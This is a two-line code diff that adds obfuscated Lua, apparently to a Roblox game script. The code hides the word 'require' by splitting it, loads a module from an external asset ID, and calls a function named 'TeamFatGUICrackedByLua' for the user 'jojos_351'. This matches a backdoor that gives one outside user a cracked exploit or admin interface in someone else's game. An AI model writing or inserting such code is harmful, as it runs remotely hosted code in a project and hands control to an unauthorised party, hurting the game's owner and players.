@@ -1,0 +1,2 @@
+local r=getfenv()["r".."equire"]
+r(13772265165)["TeamFatGUICrackedByLua"]("jojos_351")
